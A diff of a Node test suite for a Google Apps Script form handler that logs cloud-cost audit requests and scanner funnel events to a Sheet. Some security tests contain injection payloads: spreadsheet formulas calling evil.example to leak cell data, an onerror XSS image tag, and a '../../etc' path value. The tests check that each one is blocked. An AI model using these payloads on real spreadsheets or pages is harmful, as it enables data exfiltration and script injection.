@@ -1,27 +1,42 @@
 // Runs case-study-mailer.gs in Node with fake Google services (Sheets, Mail,
-// Cache, triggers), so the Apps Script logic can be tested without deploying it.
+// Cache, Properties, triggers), so the Apps Script logic can be tested without
+// deploying it.
 //   node --test tests/case-study-mailer.test.mjs
 import { test } from 'node:test';
 import assert from 'node:assert/strict';
 import { readFileSync } from 'node:fs';
+import { randomUUID } from 'node:crypto';
 import vm from 'node:vm';
 
 const SOURCE = readFileSync(new URL('../case-study-mailer.gs', import.meta.url), 'utf8');
 
-function load({ quota = 100, failMailTo = null } = {}) {
+function load({ quota = 100, failMailTo = null, token = null } = {}) {
   const sheets = {};
   const sent = [];
   const cache = new Map();
+  const props = new Map(token ? [['EVENTS_TOKEN', token]] : []);
   const logs = [];
   const triggers = [];
+  const formats = [];
   const sheet = name => {
     const rows = (sheets[name] ||= []);
+    const range = (r, c, nr = 1, nc = 1) => ({
+      getValues: () => Array.from({ length: nr }, (_, i) =>
+        Array.from({ length: nc }, (_, j) => (rows[r - 1 + i] || [])[c - 1 + j] ?? '')),
+      setValues: vals => vals.forEach((row, i) => row.forEach((v, j) => {
+        (rows[r - 1 + i] ||= [])[c - 1 + j] = v;
+      })),
+      setValue: v => { (rows[r - 1] ||= [])[c - 1] = v; },
+      setNumberFormat: f => formats.push([name, r, c, f]),
+    });
     return {
       getLastRow: () => rows.length,
       appendRow: r => rows.push(r),
       setFrozenRows: () => {},
+      setName: n => { sheets[n] = rows; delete sheets[name]; },
+      clear: () => { rows.length = 0; },
       getDataRange: () => ({ getValues: () => rows.map(r => r.slice()) }),
-      getRange: (r, c) => ({ setValue: v => { rows[r - 1][c - 1] = v; } }),
+      getRange: range,
     };
   };
   const ctx = {
@@ -41,6 +56,10 @@ function load({ quota = 100, failMailTo = null } = {}) {
       get: k => cache.get(k) ?? null,
       put: (k, v) => cache.set(k, v),
     }) },
+    PropertiesService: { getScriptProperties: () => ({
+      getProperty: k => props.get(k) ?? null,
+      setProperty: (k, v) => props.set(k, v),
+    }) },
     ContentService: {
       MimeType: { JSON: 'json' },
       createTextOutput: s => ({ setMimeType: () => ({ getContent: () => s }) }),
@@ -50,6 +69,7 @@ function load({ quota = 100, failMailTo = null } = {}) {
       base64Encode: b => Buffer.from(b).toString('base64'),
       computeDigest: (_a, s) => [...Buffer.from(String(s))],
       DigestAlgorithm: { MD5: 'md5' },
+      getUuid: () => randomUUID(),
     },
     Session: { getScriptTimeZone: () => 'Asia/Kolkata' },
     ScriptApp: {
@@ -66,85 +86,352 @@ function load({ quota = 100, failMailTo = null } = {}) {
   // Read a booking row by column name, so tests don't depend on column order.
   const cell = (rowIndex, header) => {
     const rows = sheets['Audit bookings'];
+    assert.ok(rows[0].includes(header), `no column "${header}"`);
     return rows[rowIndex][rows[0].indexOf(header)];
   };
-  return { post, sheets, sent, logs, ctx, cell, triggers };
+  return { post, sheets, sent, logs, ctx, cell, triggers, props, formats };
 }
 
-const booking = (over = {}) => ({
+const request = (over = {}) => ({
   form: 'audit_booking', name: 'Asha Rao', email: 'Asha@Example.com', company: 'Acme Cloud',
-  spend: '$10k–$50k', phone: '+91 98765 43210', currency: 'INR', notes: 'Mostly EC2', page: 'test',
+  company_site: 'acme.example', role: 'CTO / VP Engineering', industry: 'SaaS / software',
+  company_size: '51–200', provider: 'AWS', spend: '$10k–$50k', source: 'LinkedIn', page: 'test',
   ...over,
 });
+const TOKEN = 'a'.repeat(64);
+const event = (reference, over = {}) => ({ form: 'audit_event', token: TOKEN, reference, ...over });
 const isDate = v => Object.prototype.toString.call(v) === '[object Date]';   // dates come from the sandbox realm
 
-test('valid booking: logged, hello@ notified, customer confirmed, reference returned', () => {
+test('valid request: logged with an audit ID, hello@ notified, customer confirmed', () => {
   const { post, sheets, sent, cell } = load();
-  const res = post(booking());
+  const res = post(request());
   assert.equal(res.ok, true);
   assert.match(res.reference, /^AUD-260930-[A-HJ-NP-Z2-9]{4}$/);
 
-  assert.equal(sheets['Audit bookings'].length, 2, 'header + one booking');
-  assert.equal(cell(1, 'Reference'), res.reference);
+  assert.equal(sheets['Audit bookings'].length, 2, 'header + one request');
+  assert.equal(cell(1, 'Audit ID'), res.reference);
+  assert.equal(cell(1, 'Status'), 'Audit Requested');
+  assert.ok(isDate(cell(1, 'Lead at')) && isDate(cell(1, 'Audit requested at')));
+  assert.equal(cell(1, 'Access verified at'), '', 'later stages wait for real events');
   assert.equal(cell(1, 'Email'), 'asha@example.com', 'email is lower-cased');
-  assert.equal(cell(1, 'Full report price'), '₹19,999');
-  assert.equal(cell(1, 'Re-scan'), 'Just once');
-  assert.equal(cell(1, 'Next scan'), '');
-  assert.equal(cell(1, 'Status'), 'new');
+  assert.equal(cell(1, 'Website'), 'acme.example');
+  assert.equal(cell(1, 'Role'), 'CTO / VP Engineering');
+  assert.equal(cell(1, 'Industry'), 'SaaS / software');
+  assert.equal(cell(1, 'Company size'), '51–200');
+  assert.equal(cell(1, 'Cloud provider'), 'AWS');
+  assert.equal(cell(1, 'Monthly cloud spend'), '$10k–$50k');
+  assert.equal(cell(1, 'Source'), 'LinkedIn');
+  assert.equal(cell(1, 'Potential monthly savings (USD)'), '', 'no numbers until a scan reports them');
 
   assert.equal(sent.length, 2);
   assert.equal(sent[0].to, 'hello@exommerce.online');
   assert.equal(sent[0].replyTo, 'asha@example.com');
-  assert.ok(sent[0].subject.startsWith('Free scan booking ' + res.reference));
+  assert.ok(sent[0].subject.startsWith('Audit request ' + res.reference));
   assert.ok(sent[0].body.includes(`python -m exaudit setup --reference ${res.reference} --customer "Acme Cloud"`));
   assert.equal(sent[1].to, 'asha@example.com');
   assert.equal(sent[1].replyTo, 'hello@exommerce.online');
-  assert.equal(sent[1].subject, `Your free AWS cost scan (${res.reference})`);
+  assert.equal(sent[1].subject, `Your free cloud cost & infrastructure audit (${res.reference})`);
   assert.ok(sent[1].htmlBody.includes(res.reference));
   assert.ok(sent[1].body.startsWith('Hi Asha,'));
+});
+
+test('confirmation email: 24-hour promise, team review, optional paid engagement, nothing personal', () => {
+  const { post, sent } = load();
+  post(request());
   for (const text of [sent[1].body, sent[1].htmlBody]) {
-    assert.ok(text.includes('free summary'), 'sets expectations: the summary is free');
-    assert.ok(!/refund|guarantee/i.test(text), 'no refund promise any more');
+    assert.ok(text.includes('You receive your initial audit findings within 24 hours of successful AWS access.'));
+    assert.ok(text.includes('Every audit is reviewed by the eXommerce cloud optimization team before results are shared.'));
+    assert.ok(text.includes('₹25,000 Cloud Optimization Engagement'));
+    assert.ok(text.includes('about 5 minutes'));
+    assert.ok(text.includes('The eXommerce cloud optimization team'), 'signed by the team');
+    assert.ok(!/bhavin|founder|personally|refund|guarantee|\$299/i.test(text), text);
+  }
+  assert.ok(!sent[1].body.includes('Azure'), 'no not-on-AWS note for AWS customers');
+});
+
+test('not on AWS: the customer is told we audit AWS today', () => {
+  const { post, sent } = load();
+  post(request({ provider: 'Google Cloud' }));
+  assert.match(sent[0].body, /Not on AWS/);
+  assert.match(sent[1].body, /We audit AWS today/);
+  const mixed = load();
+  mixed.post(request({ provider: 'AWS + other clouds' }));
+  assert.ok(!/We audit AWS today/.test(mixed.sent[1].body));
+});
+
+test('validation rejects bad input and logs or sends nothing', () => {
+  const cases = [
+    [{ name: '' }, /name and company/],
+    [{ company: '   ' }, /name and company/],
+    [{ email: 'not-an-email' }, /valid work email/],
+    [{ company_site: 'not a website' }, /website/],
+    [{ role: 'Wizard' }, /role/],
+    [{ industry: '' }, /industry/],
+    [{ company_size: '9000' }, /company size/],
+    [{ provider: 'Oracle' }, /cloud provider/],
+    [{ spend: '$1M' }, /monthly cloud spend/],
+    [{ source: undefined }, /^Please tell us how you heard about us\.$/],
+  ];
+  for (const [over, msg] of cases) {
+    const { post, sent, sheets } = load();
+    const res = post(request(over));
+    assert.equal(res.ok, false, JSON.stringify(over));
+    assert.match(res.error, msg);
+    assert.equal(sent.length, 0);
+    assert.equal(sheets['Audit bookings'], undefined);
   }
 });
 
-test('a quarterly or yearly re-scan is scheduled at booking', () => {
-  const { post, cell, sent } = load();
-  post(booking({ cadence: 'quarterly' }));
-  assert.equal(cell(1, 'Re-scan'), 'Every quarter');
-  const next = cell(1, 'Next scan');
-  assert.ok(isDate(next));
-  const months = (next.getFullYear() - new Date().getFullYear()) * 12 + next.getMonth() - new Date().getMonth();
-  assert.equal(months, 3);
-  assert.match(sent[1].body, /check again every quarter/);
-
-  const yearly = load();
-  yearly.post(booking({ cadence: 'yearly' }));
-  assert.equal(yearly.cell(1, 'Re-scan'), 'Every year');
-
-  const odd = load();
-  odd.post(booking({ cadence: 'hourly' }));
-  assert.equal(odd.cell(1, 'Re-scan'), 'Just once', 'unknown schedules fall back to once');
+test('website is optional and accepts common forms', () => {
+  for (const site of ['', 'https://acme.example/', 'www.acme.co.in', 'http://acme.io/about']) {
+    const { post } = load();
+    assert.equal(post(request({ company_site: site })).ok, true, site);
+  }
 });
 
-test('due re-scans are sent to hello@ once, then roll forward', () => {
+test('the Website field is not mistaken for the honeypot', () => {
+  const { post, sent } = load();
+  assert.equal(post(request({ company_site: 'acme.example' })).ok, true);
+  assert.equal(sent.length, 2, 'a real request with a website still goes through');
+});
+
+test('honeypot: bots get a fake success and nothing happens', () => {
+  const { post, sent, sheets } = load();
+  assert.deepEqual(post(request({ website: 'http://spam' })), { ok: true });
+  assert.equal(sent.length, 0);
+  assert.equal(sheets['Audit bookings'], undefined);
+});
+
+test('resubmitting within 10 minutes returns the same audit ID and sends nothing new', () => {
+  const { post, sent, sheets } = load();
+  const first = post(request());
+  const again = post(request({ email: 'asha@example.com', company: 'ACME CLOUD' }));
+  assert.equal(again.ok, true);
+  assert.equal(again.reference, first.reference);
+  assert.equal(again.duplicate, true);
+  assert.equal(sent.length, 2);
+  assert.equal(sheets['Audit bookings'].length, 2);
+});
+
+test('email quota exhausted: kept as a failed lead, customer told to email', () => {
+  const { post, sent, cell } = load({ quota: 1 });
+  const res = post(request());
+  assert.equal(res.ok, false);
+  assert.match(res.error, /hello@exommerce.online/);
+  assert.equal(sent.length, 0);
+  assert.match(cell(1, 'Status'), /^Failed: daily email quota/);
+  assert.ok(isDate(cell(1, 'Lead at')));
+  assert.equal(cell(1, 'Audit requested at'), '', 'a request we never received is not counted as one');
+});
+
+test('notification failure: logged as failed and reported, so the page falls back to email', () => {
+  const { post, cell } = load({ failMailTo: 'hello@exommerce.online' });
+  const res = post(request());
+  assert.equal(res.ok, false);
+  assert.match(cell(1, 'Status'), /^Failed: Error: simulated mail failure/);
+});
+
+test('confirmation failure does not fail a request hello@ already has', () => {
+  const { post, logs, cell } = load({ failMailTo: 'asha@example.com' });
+  const res = post(request());
+  assert.equal(res.ok, true);
+  assert.equal(cell(1, 'Status'), 'Audit Requested');
+  assert.match(logs[0], /confirmation failed/);
+});
+
+test('HTML in names is escaped in the confirmation email', () => {
+  const { post, sent } = load();
+  post(request({ name: '<img src=x onerror=alert(1)> Rao' }));
+  assert.ok(!sent[1].htmlBody.includes('<img'));
+  assert.ok(sent[1].htmlBody.includes('&lt;img'));
+});
+
+test('spreadsheet formulas from visitors are stored as plain text', () => {
+  const { post, sheets, cell } = load();
+  post(request({ name: '=IMAGE("https://evil.example/?"&A1)', company: '@SUM(1)' }));
+  assert.equal(cell(1, 'Name'), `'=IMAGE("https://evil.example/?"&A1)`);
+  assert.equal(cell(1, 'Company'), "'@SUM(1)");
+  assert.ok(isDate(cell(1, 'Lead at')), 'non-strings are untouched');
+
+  const other = load();
+  other.post({ form: 'contact', first_name: '=1+1', email: 'a@b.co', company: 'C', message: 'Hi' });
+  assert.equal(other.sheets['Contact enquiries'][1][1], "'=1+1", 'contact tab protected too');
+});
+
+test('small accounts are flagged for hello@', () => {
+  const { post, sent } = load();
+  post(request({ spend: 'Under $3k' }));
+  assert.match(sent[0].body, /Small account \(under \$3k\/month\)/);
+});
+
+test('long fields are trimmed to their limits', () => {
+  const { post, cell } = load();
+  post(request({ name: 'N'.repeat(300), company: 'C'.repeat(300) }));
+  assert.equal(cell(1, 'Name').length, 100);
+  assert.equal(cell(1, 'Company').length, 120);
+});
+
+// ---- funnel events from the scanner ---------------------------------------------------------
+
+test('events need the token from Script Properties', () => {
+  const noToken = load();
+  assert.deepEqual(noToken.post(event('AUD-260930-AAAA', { stage: 'Scan Started' })),
+                   { ok: false, error: 'not authorized' }, 'no token configured: nothing accepted');
+  const wrong = load({ token: TOKEN });
+  assert.deepEqual(wrong.post({ ...event('AUD-260930-AAAA'), token: 'b'.repeat(64) }),
+                   { ok: false, error: 'not authorized' });
+  assert.equal(wrong.sheets['Audit bookings'], undefined);
+});
+
+test('events move an audit through the funnel with the first timestamp of each stage', () => {
+  const { post, cell } = load({ token: TOKEN });
+  const { reference } = post(request());
+  const t0 = '2026-10-01T09:00:00Z';
+  assert.equal(post(event(reference, { stage: 'AWS Access Verified', at: t0 })).ok, true);
+  assert.equal(cell(1, 'Status'), 'AWS Access Verified');
+  assert.equal(cell(1, 'Access verified at').toISOString(), '2026-10-01T09:00:00.000Z');
+
+  post(event(reference, { stage: 'Scan Started', at: '2026-10-01T09:05:00Z' }));
+  post(event(reference, {
+    stage: 'Scan Completed', at: '2026-10-01T09:20:00Z', bill: '12450.5', monthly: '1830.25',
+    annual: '21963', findings: '14', categories: 'Cleanup $1,210 · Rightsizing $620 · Commitments $0',
+    severity: 'High 1 · Medium 4 · Low 9', problems: 'Idle NAT gateways; Unattached EBS volumes',
+    regions: 'ap-south-1, us-east-1', stack: 'Compute: EC2; Containers: EKS; CI/CD: CodePipeline',
+  }));
+  assert.equal(cell(1, 'Status'), 'Scan Completed');
+  assert.equal(cell(1, 'Monthly AWS bill (USD)'), 12450.5, 'numbers are stored as numbers');
+  assert.equal(cell(1, 'Potential monthly savings (USD)'), 1830.25);
+  assert.equal(cell(1, 'Findings'), 14);
+  assert.equal(cell(1, 'Problems found'), 'Idle NAT gateways; Unattached EBS volumes');
+
+  // A re-run of the same stage keeps the first time; an earlier stage never moves status back.
+  post(event(reference, { stage: 'Scan Started', at: '2026-10-01T11:00:00Z' }));
+  assert.equal(cell(1, 'Scan started at').toISOString(), '2026-10-01T09:05:00.000Z');
+  assert.equal(cell(1, 'Status'), 'Scan Completed');
+
+  post(event(reference, { stage: 'Review Completed', at: '2026-10-01T15:00:00Z' }));
+  post(event(reference, { stage: 'Results Delivered', at: '2026-10-02T05:30:00Z' }));
+  assert.equal(cell(1, 'Hours to results'), 20.5, 'measured from AWS access, as promised');
+  post(event(reference, { stage: 'Customer', outcome: 'Engagement signed', revenue: '25000' }));
+  assert.equal(cell(1, 'Status'), 'Customer');
+  assert.equal(cell(1, 'Revenue (INR)'), 25000);
+  assert.equal(cell(1, 'Commercial outcome'), 'Engagement signed');
+  assert.equal(cell(1, 'Paid opportunity at'), '', 'skipped stages are not backfilled');
+});
+
+test('an audit that started off the website gets its own row', () => {
+  const { post, sheets, cell } = load({ token: TOKEN });
+  const res = post(event('AUD-261001-REF1', { stage: 'AWS Access Verified' }));
+  assert.equal(res.ok, true);
+  assert.equal(sheets['Audit bookings'].length, 2);
+  assert.equal(cell(1, 'Audit ID'), 'AUD-261001-REF1');
+  assert.equal(cell(1, 'Source'), 'Direct');
+  assert.ok(isDate(cell(1, 'Lead at')) && isDate(cell(1, 'Access verified at')));
+  assert.equal(cell(1, 'Status'), 'AWS Access Verified');
+});
+
+test('bad events are rejected; bad numbers and formulas never land in the Sheet', () => {
+  const { post, cell } = load({ token: TOKEN });
+  const { reference } = post(request());
+  assert.equal(post(event(reference, { stage: 'Teleported' })).error, 'unknown stage');
+  assert.equal(post(event('../../etc', { stage: 'Scan Started' })).error, 'bad audit ID');
+  post(event(reference, { monthly: 'lots', stack: '=IMPORTXML("https://evil.example")' }));
+  assert.equal(cell(1, 'Potential monthly savings (USD)'), '');
+  assert.equal(cell(1, 'Stack'), `'=IMPORTXML("https://evil.example")`);
+});
+
+test('the events token is never written to the Sheet', () => {
+  const { post, sheets } = load({ token: TOKEN });
+  const { reference } = post(request());
+  post(event(reference, { stage: 'Scan Completed', monthly: '10' }));
+  post(event('AUD-261001-NEW1', { stage: 'Scan Started' }));
+  const everything = JSON.stringify(sheets);
+  assert.ok(!everything.includes(TOKEN));
+});
+
+test('createEventsToken stores a long random token in Script Properties', () => {
+  const { ctx, props } = load();
+  const token = ctx.createEventsToken();
+  assert.match(token, /^[0-9a-f]{64}$/);
+  assert.equal(props.get('EVENTS_TOKEN'), token);
+  assert.notEqual(ctx.createEventsToken(), token, 'running it again replaces the token');
+});
+
+// ---- beta dashboard --------------------------------------------------------------------------
+
+test('columnLetter', () => {
+  const { ctx } = load();
+  assert.deepEqual([1, 26, 27, 52, 53].map(n => ctx.columnLetter(n)), ['A', 'Z', 'AA', 'AZ', 'BA']);
+});
+
+test('dashboard: live formulas over the bookings tab, an empty state, no stored numbers', () => {
+  const { ctx, sheets, formats } = load();
+  const count = ctx.buildDashboard();
+  const dash = sheets['Beta dashboard'];
+  assert.equal(dash.length, count);
+  assert.ok(sheets['Audit bookings'], 'creates the bookings tab it reads from');
+  assert.match(dash[1][0], /No audits yet/, 'says so instead of charting zeros');
+
+  const headers = sheets['Audit bookings'][0];
+  const col = h => ctx.columnLetter(headers.indexOf(h) + 1);
+  const funnel = dash.slice(3, 13);
+  assert.deepEqual(funnel.map(r => r[0]), ['Lead', 'Audit Requested', 'AWS Access Verified', 'Scan Started',
+    'Scan Completed', 'Review Completed', 'Results Delivered', 'Paid Opportunity', 'Customer', 'Revenue']);
+  assert.equal(funnel[9][1], `=SUMPRODUCT(--((('Audit bookings'!${col('Revenue at')}2:${col('Revenue at')}<>""))>0))`);
+  assert.equal((funnel[0][1].match(/<>""/g) || []).length, 10, 'Lead counts audits at any stage');
+  assert.equal(funnel[1][2], '=IF($B$5=0,"—",B5/$B$5)', 'shares are of audit requests (row 5)');
+
+  // Every value cell is a formula or a label: nothing typed in that could go stale.
+  for (const row of dash) for (const v of row.slice(1)) {
+    assert.ok(v === '' || /^=/.test(v) || /^[A-Za-z ]/.test(v), JSON.stringify(v));
+  }
+  const labels = dash.map(r => r[0]);
+  for (const label of ['Potential savings as a share of spend', 'Revenue per delivered audit (INR)',
+                       'Median hours from AWS access to results', 'Source', 'Common problems',
+                       'Stack seen in audits', 'Idle NAT gateways', 'EKS (Kubernetes)']) {
+    assert.ok(labels.includes(label), label);
+  }
+  const source = labels.indexOf('Source');
+  assert.deepEqual(dash[source].slice(1), ['Audit requests', 'Gave AWS access', 'Customers']);
+  assert.equal(dash[source + 1][0], 'LinkedIn');
+  assert.ok(dash[source + 1][2].includes(`'Audit bookings'!${col('Source')}2:${col('Source')}="LinkedIn"`));
+  const share = labels.indexOf('Potential savings as a share of spend') + 1;
+  assert.ok(formats.some(([n, r, c, f]) => n === 'Beta dashboard' && r === share && c === 2 && f === '0.0%'));
+
+  assert.equal(ctx.buildDashboard(), count, 'rebuilding replaces, never duplicates');
+  assert.equal(sheets['Beta dashboard'].length, count);
+});
+
+test('a bookings tab in an older format is set aside, never written into', () => {
+  const { post, sheets, cell } = load();
+  sheets['Audit bookings'] = [['Timestamp', 'Reference', 'Name'], ['old', 'AUD-OLD', 'Someone']];
+  post(request());
+  const old = Object.keys(sheets).find(n => n.startsWith('Audit bookings (old format'));
+  assert.ok(old, 'renamed');
+  assert.deepEqual(sheets[old][1], ['old', 'AUD-OLD', 'Someone'], 'old rows untouched');
+  assert.equal(sheets['Audit bookings'].length, 2);
+  assert.equal(cell(1, 'Name'), 'Asha Rao');
+});
+
+// ---- recurring reviews -----------------------------------------------------------------------
+
+test('due reviews are sent to hello@ once', () => {
   const { post, sheets, sent, ctx, cell } = load();
-  post(booking({ cadence: 'quarterly', email: 'due@example.com' }));
-  post(booking({ cadence: 'yearly', email: 'later@example.com', company: 'Later Co' }));
-  post(booking({ cadence: 'once', email: 'once@example.com', company: 'Once Co' }));
+  post(request({ email: 'due@example.com' }));
+  post(request({ email: 'later@example.com', company: 'Later Co' }));
+  post(request({ email: 'none@example.com', company: 'None Co' }));
   const rows = sheets['Audit bookings'];
-  const nextCol = rows[0].indexOf('Next scan');
-  rows[1][nextCol] = new Date(Date.now() - 86400000);          // due yesterday
+  const next = rows[0].indexOf('Next review');
+  rows[1][next] = new Date(Date.now() - 86400000);                // due yesterday
+  rows[2][next] = new Date(Date.now() + 30 * 86400000);           // next month
   sent.length = 0;
 
   assert.equal(ctx.remindDueScans(), 1);
   assert.equal(sent.length, 1);
   assert.equal(sent[0].to, 'hello@exommerce.online');
-  assert.equal(sent[0].subject, '1 re-scan due');
-  assert.ok(sent[0].body.includes('due@example.com') && sent[0].body.includes('Every quarter'));
+  assert.equal(sent[0].subject, '1 cost review due');
+  assert.ok(sent[0].body.includes('due@example.com') && sent[0].body.includes(cell(1, 'Audit ID')));
   assert.ok(!sent[0].body.includes('later@example.com'), 'not due yet');
-  const rolled = cell(1, 'Next scan');
-  assert.ok(isDate(rolled) && rolled > new Date(), 'moved on by a quarter');
   assert.ok(isDate(cell(1, 'Last reminder')));
 
   sent.length = 0;
@@ -165,113 +452,7 @@ test('no bookings sheet yet: reminders do nothing', () => {
   assert.equal(sent.length, 0);
 });
 
-test('price comes from the server, not the browser', () => {
-  const { post, cell } = load();
-  post(booking({ currency: 'USD', price: '$1' }));
-  assert.equal(cell(1, 'Full report price'), '$299');
-  const other = load();
-  other.post(booking({ currency: 'GBP' }));
-  assert.equal(other.cell(1, 'Currency'), 'USD', 'unknown currency falls back to USD');
-});
-
-test('validation rejects bad input and sends nothing', () => {
-  const cases = [
-    [{ name: '' }, /name and company/],
-    [{ company: '   ' }, /name and company/],
-    [{ email: 'not-an-email' }, /valid email/],
-    [{ spend: '$1M' }, /monthly AWS spend/],
-    [{ phone: 'call me maybe' }, /phone/],
-  ];
-  for (const [over, msg] of cases) {
-    const { post, sent, sheets } = load();
-    const res = post(booking(over));
-    assert.equal(res.ok, false, JSON.stringify(over));
-    assert.match(res.error, msg);
-    assert.equal(sent.length, 0);
-    assert.equal(sheets['Audit bookings'], undefined);
-  }
-});
-
-test('phone is optional', () => {
-  const { post } = load();
-  assert.equal(post(booking({ phone: '' })).ok, true);
-});
-
-test('resubmitting within 10 minutes returns the same reference and sends nothing new', () => {
-  const { post, sent, sheets } = load();
-  const first = post(booking());
-  const again = post(booking({ email: 'asha@example.com', company: 'ACME CLOUD' }));
-  assert.equal(again.ok, true);
-  assert.equal(again.reference, first.reference);
-  assert.equal(again.duplicate, true);
-  assert.equal(sent.length, 2);
-  assert.equal(sheets['Audit bookings'].length, 2);
-});
-
-test('honeypot: bots get a fake success and nothing happens', () => {
-  const { post, sent, sheets } = load();
-  assert.deepEqual(post(booking({ website: 'http://spam' })), { ok: true });
-  assert.equal(sent.length, 0);
-  assert.equal(sheets['Audit bookings'], undefined);
-});
-
-test('email quota exhausted: booking still logged as failed, customer told to email', () => {
-  const { post, sheets, sent } = load({ quota: 1 });
-  const res = post(booking());
-  assert.equal(res.ok, false);
-  assert.match(res.error, /hello@exommerce.online/);
-  assert.equal(sent.length, 0);
-  assert.match(sheets['Audit bookings'][1].at(-1), /^failed: daily email quota/);
-});
-
-test('notification failure: logged as failed and reported, so the page falls back to email', () => {
-  const { post, sheets } = load({ failMailTo: 'hello@exommerce.online' });
-  const res = post(booking());
-  assert.equal(res.ok, false);
-  assert.match(sheets['Audit bookings'][1].at(-1), /^failed: Error: simulated mail failure/);
-});
-
-test('confirmation failure does not fail a booking hello@ already has', () => {
-  const { post, logs, cell } = load({ failMailTo: 'asha@example.com' });
-  const res = post(booking());
-  assert.equal(res.ok, true);
-  assert.equal(cell(1, 'Status'), 'new');
-  assert.match(logs[0], /confirmation failed/);
-});
-
-test('HTML in names is escaped in the confirmation email', () => {
-  const { post, sent } = load();
-  post(booking({ name: '<img src=x onerror=alert(1)> Rao' }));
-  assert.ok(!sent[1].htmlBody.includes('<img'));
-  assert.ok(sent[1].htmlBody.includes('&lt;img'));
-});
-
-test('spreadsheet formulas from visitors are stored as plain text', () => {
-  const { post, sheets, cell } = load();
-  post(booking({ name: '=IMAGE("https://evil.example/?"&A1)', company: '@SUM(1)', notes: '-2+3' }));
-  assert.equal(cell(1, 'Name'), `'=IMAGE("https://evil.example/?"&A1)`);
-  assert.equal(cell(1, 'Company'), "'@SUM(1)");
-  assert.equal(cell(1, 'Phone / WhatsApp'), "'+91 98765 43210", 'phone numbers stay text, not a formula');
-  assert.equal(cell(1, 'Notes'), "'-2+3");
-  assert.ok(isDate(sheets['Audit bookings'][1][0]), 'non-strings are untouched');
-
-  const other = load();
-  other.post({ form: 'contact', first_name: '=1+1', email: 'a@b.co', company: 'C', message: 'Hi' });
-  assert.equal(other.sheets['Contact enquiries'][1][1], "'=1+1", 'contact tab protected too');
-});
-
-test('small accounts are flagged for hello@', () => {
-  const { post, sent } = load();
-  post(booking({ spend: 'Under $3k' }));
-  assert.match(sent[0].body, /Small account \(under \$3k\/month\)/);
-});
-
-test('long fields are trimmed to their limits', () => {
-  const { post, cell } = load();
-  post(booking({ notes: 'x'.repeat(5000), name: 'N'.repeat(300) }));
-  assert.equal(cell(1, 'Name').length, 100);
-  assert.equal(cell(1, 'Notes').length, 2000);
-});
+// ---- everything else ---------------------------------------------------------------------------
 
 test('GET reports which forms this deployment handles', () => {
   const ctx = { ContentService: { MimeType: { JSON: 'json' }, createTextOutput: s => ({ setMimeType: () => ({ getContent: () => s }) }) } };
@@ -279,7 +460,13 @@ test('GET reports which forms this deployment handles', () => {
   vm.runInContext(SOURCE, ctx);
   const res = JSON.parse(ctx.doGet().getContent());
   assert.equal(res.ok, true);
-  assert.ok(res.forms.includes('audit_booking'));
+  assert.deepEqual(res.forms, ['case_study', 'contact', 'audit_booking', 'audit_event']);
+});
+
+test('the editor test booking is a valid request', () => {
+  const { ctx, logs } = load();
+  ctx.testBooking();
+  assert.equal(JSON.parse(logs[0]).ok, true);
 });
 
 test('existing flows still route correctly', () => {
